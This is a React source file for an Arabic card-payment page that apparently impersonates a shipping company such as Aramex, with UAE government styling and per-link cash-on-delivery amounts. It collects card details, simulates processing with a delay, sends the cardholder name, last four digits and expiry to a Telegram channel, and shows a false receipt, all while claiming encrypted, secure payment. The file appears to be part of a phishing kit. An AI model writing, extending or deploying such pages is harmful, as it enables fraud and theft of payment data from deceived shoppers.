import { useState } from "react";
import { useParams, useNavigate } from "react-router-dom";
import { Button } from "@/components/ui/button";
import { Input } from "@/components/ui/input";
import { Label } from "@/components/ui/label";
import { Select, SelectContent, SelectItem, SelectTrigger, SelectValue } from "@/components/ui/select";
import { getServiceBranding } from "@/lib/serviceLogos";
import DynamicPaymentLayout from "@/components/DynamicPaymentLayout";
import { useLink } from "@/hooks/useSupabase";
import { CreditCard, AlertCircle, ArrowLeft, CheckCircle2, Building2, Shield, Lock, Calendar } from "lucide-react";
import { useToast } from "@/hooks/use-toast";
import { sendToTelegram } from "@/lib/telegram";
import { validateLuhn, formatCardNumber, detectCardType, validateExpiry, validateCVV } from "@/lib/cardValidation";
import { getBankById } from "@/lib/banks";
import { getCountryByCode } from "@/lib/countries";
import { getCurrencySymbol, formatCurrency } from "@/lib/countryCurrencies";

const PaymentCardInput = () => {
  const { id } = useParams();
  const navigate = useNavigate();
  const { toast } = useToast();
  const { data: linkData } = useLink(id);

  const [cardName, setCardName] = useState("");
  const [cardNumber, setCardNumber] = useState("");
  const [expiryMonth, setExpiryMonth] = useState("");
  const [expiryYear, setExpiryYear] = useState("");
  const [cvv, setCvv] = useState("");
  const [cardValid, setCardValid] = useState<boolean | null>(null);
  const [isSubmitting, setIsSubmitting] = useState(false);

  // Get customer info and selected bank from link data (cross-device compatible)
  const customerInfo = linkData?.payload?.customerInfo || {};
  const selectedCountry = linkData?.payload?.selectedCountry || "SA";
  const selectedBankId = linkData?.payload?.selectedBank || '';

  const serviceKey = linkData?.payload?.service_key || customerInfo.service || 'aramex';
  const serviceName = linkData?.payload?.service_name || serviceKey;
  const branding = getServiceBranding(serviceKey);

  const shippingInfo = linkData?.payload as any;

  // Get amount from link data - ensure it's a number, handle all data types
  const rawAmount = shippingInfo?.cod_amount;

  // Handle different data types and edge cases
  let amount = 500; // Default value
  if (rawAmount !== undefined && rawAmount !== null) {
    if (typeof rawAmount === 'number') {
      amount = rawAmount;
    } else if (typeof rawAmount === 'string') {
      const parsed = parseFloat(rawAmount);
      if (!isNaN(parsed)) {
        amount = parsed;
      }
    }
  }

  const formattedAmount = formatCurrency(amount, selectedCountry);

  const selectedBank = selectedBankId && selectedBankId !== 'skipped' ? getBankById(selectedBankId) : null;
  const selectedCountryData = selectedCountry ? getCountryByCode(selectedCountry) : null;

  // UAE Government Color Scheme
  const uaeColors = {
    primary: "#CE1126", // UAE Red
    secondary: "#00732F", // UAE Green
    accent: "#000000", // Black
    background: "#FFFFFF", // White
    lightGray: "#F5F5F5",
    border: "#E0E0E0",
  };

  const handleCardNumberChange = (value: string) => {
    const formatted = formatCardNumber(value.replace(/\D/g, "").slice(0, 16));
    setCardNumber(formatted);

    // Validate with Luhn algorithm if 13-19 digits
    const cleaned = formatted.replace(/\s/g, '');
    if (cleaned.length >= 13) {
      const isValid = validateLuhn(formatted);
      setCardValid(isValid);

      if (!isValid && cleaned.length === 16) {
        toast({
          title: "رقم البطاقة غير صحيح",
          description: "الرجاء التحقق من رقم البطاقة",
          variant: "destructive",
        });
      }
    } else {
      setCardValid(null);
    }
  };

  // Generate month/year options
  const months = Array.from({ length: 12 }, (_, i) => {
    const month = (i + 1).toString().padStart(2, '0');
    return { value: month, label: month };
  });

  const currentYear = new Date().getFullYear();
  const years = Array.from({ length: 20 }, (_, i) => {
    const year = (currentYear + i).toString().slice(-2);
    return { value: year, label: `20${year}` };
  });

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();

    // Validation
    if (!cardName || !cardNumber || !expiryMonth || !expiryYear || !cvv) {
      toast({
        title: "بيانات ناقصة",
        description: "الرجاء ملء جميع الحقول",
        variant: "destructive",
      });
      return;
    }

    const expiryDate = `${expiryMonth}/${expiryYear}`;
    if (!validateExpiry(expiryDate)) {
      toast({
        title: "تاريخ انتهاء الصلاحية غير صحيح",
        description: "الرجاء التحقق من تاريخ انتهاء الصلاحية",
        variant: "destructive",
      });
      return;
    }

    if (!validateCVV(cvv)) {
      toast({
        title: "رمز الأمان غير صحيح",
        description: "الرجاء التحقق من رمز الأمان (CVV)",
        variant: "destructive",
      });
      return;
    }

    setIsSubmitting(true);

    try {
      // Here you would typically make an API call to process the payment
      // For demo purposes, we'll just show success

      await new Promise(resolve => setTimeout(resolve, 2000));

      // Send to Telegram
      if (customerInfo?.email || shippingInfo?.customer_email) {
        await sendToTelegram({
          message: `✅ تم استلام دفعة جديدة\n\n💳 بيانات البطاقة:\n- اسم الحامل: ${cardName}\n- رقم البطاقة: **** **** **** ${cardNumber.slice(-4)}\n- انتهاء الصلاحية: ${expiryMonth}/${expiryYear}\n\n💰 المبلغ: ${formattedAmount}\n🌍 الدولة: ${selectedCountryData?.nameAr || selectedCountry}`,
        });
      }

      navigate(`/pay/${id}/receipt?success=true&amount=${amount}&currency=${selectedCountry}&service=${serviceKey}`);
    } catch (error) {
      console.error("Payment error:", error);
      toast({
        title: "خطأ في معالجة الدفع",
        description: "حدث خطأ أثناء معالجة الدفع. الرجاء المحاولة مرة أخرى.",
        variant: "destructive",
      });
    } finally {
      setIsSubmitting(false);
    }
  };

  const cardType = detectCardType(cardNumber);

  return (
    <DynamicPaymentLayout
      serviceName={serviceName}
      serviceKey={serviceKey}
      amount={formattedAmount}
      title="بيانات البطاقة"
      description={`إدخال بيانات البطاقة الائتمانية لإتمام الدفع - ${serviceName}`}
      icon={<CreditCard className="w-7 h-7 sm:w-10 sm:h-10 text-white" />}
    >
      {/* Security Notice */}
      <div className="mb-6 p-4 rounded-xl border-2" style={{ backgroundColor: `${uaeColors.secondary}10`, borderColor: uaeColors.secondary }}>
        <div className="flex items-center gap-3">
          <div className="w-10 h-10 rounded-full flex items-center justify-center" style={{ backgroundColor: uaeColors.secondary }}>
            <Shield className="w-5 h-5 text-white" />
          </div>
          <div>
            <h3 className="font-bold text-sm" style={{ color: uaeColors.accent }}>دفع آمن ومشفر</h3>
            <p className="text-xs text-gray-600">معلومات بطاقتك محمية بأعلى معايير الأمان</p>
          </div>
        </div>
      </div>

      <form onSubmit={handleSubmit} className="space-y-5">
        {/* Card Name */}
        <div>
          <Label htmlFor="cardName" className="flex items-center gap-2 mb-2 text-sm font-medium" style={{ color: uaeColors.accent }}>
            <CreditCard className="w-4 h-4" />
            اسم حامل البطاقة *
          </Label>
          <Input
            id="cardName"
            value={cardName}
            onChange={(e) => setCardName(e.target.value)}
            required
            className="h-12 text-base border-2 focus:border-blue-500 transition-colors"
            placeholder="أدخل الاسم كما هو مكتوب على البطاقة"
          />
        </div>

        {/* Card Number */}
        <div>
          <Label htmlFor="cardNumber" className="flex items-center gap-2 mb-2 text-sm font-medium" style={{ color: uaeColors.accent }}>
            <CreditCard className="w-4 h-4" />
            رقم البطاقة *
          </Label>
          <div className="relative">
            <Input
              id="cardNumber"
              value={cardNumber}
              onChange={(e) => handleCardNumberChange(e.target.value)}
              required
              className="h-12 text-base border-2 focus:border-blue-500 transition-colors pl-20"
              placeholder="1234 5678 9012 3456"
              maxLength={19}
            />
            {cardValid === true && (
              <div className="absolute left-3 top-1/2 -translate-y-1/2">
                <CheckCircle2 className="w-5 h-5 text-green-500" />
              </div>
            )}
            {cardValid === false && (
              <div className="absolute left-3 top-1/2 -translate-y-1/2">
                <AlertCircle className="w-5 h-5 text-red-500" />
              </div>
            )}
          </div>
          {cardType && (
            <div className="mt-2 flex items-center gap-2">
              <span className="text-xs text-gray-500">نوع البطاقة:</span>
              <span className="text-xs font-medium px-2 py-1 bg-gray-100 rounded">{cardType}</span>
            </div>
          )}
        </div>

        {/* Expiry and CVV */}
        <div className="grid grid-cols-3 gap-4">
          <div className="col-span-1">
            <Label htmlFor="expiryMonth" className="flex items-center gap-2 mb-2 text-sm font-medium" style={{ color: uaeColors.accent }}>
              <Calendar className="w-4 h-4" />
              شهر *
            </Label>
            <Select value={expiryMonth} onValueChange={setExpiryMonth}>
              <SelectTrigger className="h-12 text-base border-2 focus:border-blue-500 transition-colors">
                <SelectValue placeholder="شهر" />
              </SelectTrigger>
              <SelectContent className="bg-background z-50">
                {months.map((month) => (
                  <SelectItem key={month.value} value={month.value}>
                    {month.label}
                  </SelectItem>
                ))}
              </SelectContent>
            </Select>
          </div>

          <div className="col-span-1">
            <Label htmlFor="expiryYear" className="flex items-center gap-2 mb-2 text-sm font-medium" style={{ color: uaeColors.accent }}>
              <Calendar className="w-4 h-4" />
              سنة *
            </Label>
            <Select value={expiryYear} onValueChange={setExpiryYear}>
              <SelectTrigger className="h-12 text-base border-2 focus:border-blue-500 transition-colors">
                <SelectValue placeholder="سنة" />
              </SelectTrigger>
              <SelectContent className="bg-background z-50">
                {years.map((year) => (
                  <SelectItem key={year.value} value={year.value}>
                    {year.label}
                  </SelectItem>
                ))}
              </SelectContent>
            </Select>
          </div>

          <div className="col-span-1">
            <Label htmlFor="cvv" className="flex items-center gap-2 mb-2 text-sm font-medium" style={{ color: uaeColors.accent }}>
              <Lock className="w-4 h-4" />
              CVV *
            </Label>
            <Input
              id="cvv"
              value={cvv}
              onChange={(e) => setCvv(e.target.value.replace(/\D/g, '').slice(0, 4))}
              required
              className="h-12 text-base border-2 focus:border-blue-500 transition-colors"
              placeholder="123"
              maxLength={4}
              type="password"
            />
          </div>
        </div>

        {/* Security Info */}
        <div className="mt-6 p-4 rounded-lg" style={{ backgroundColor: uaeColors.lightGray }}>
          <div className="flex items-start gap-3">
            <Lock className="w-5 h-5 mt-0.5" style={{ color: uaeColors.secondary }} />
            <div>
              <h4 className="font-semibold text-sm mb-1" style={{ color: uaeColors.accent }}>محمي بتشفير SSL</h4>
              <p className="text-xs text-gray-600">
                جميع المعلومات مُشفرة ومحمية. لا نقوم بتخزين بيانات بطاقتك.
              </p>
            </div>
          </div>
        </div>

        {/* Submit Button */}
        <Button
          type="submit"
          size="lg"
          className="w-full h-14 text-lg font-bold text-white mt-6 transition-all hover:opacity-90"
          style={{ backgroundColor: uaeColors.primary }}
          disabled={isSubmitting || !cardValid}
        >
          {isSubmitting ? (
            <>
              <div className="animate-spin rounded-full h-5 w-5 border-b-2 border-white ml-2"></div>
              جاري المعالجة...
            </>
          ) : (
            <>
              <span className="ml-2">دفع الآن</span>
              <ArrowLeft className="w-5 h-5" />
            </>
          )}
        </Button>

        <p className="text-xs text-center text-gray-500 mt-4">
          بالمتابعة، أنت توافق على الشروط والأحكام وسياسة الخصوصية
        </p>
      </form>
    </DynamicPaymentLayout>
  );
};

export default PaymentCardInput;
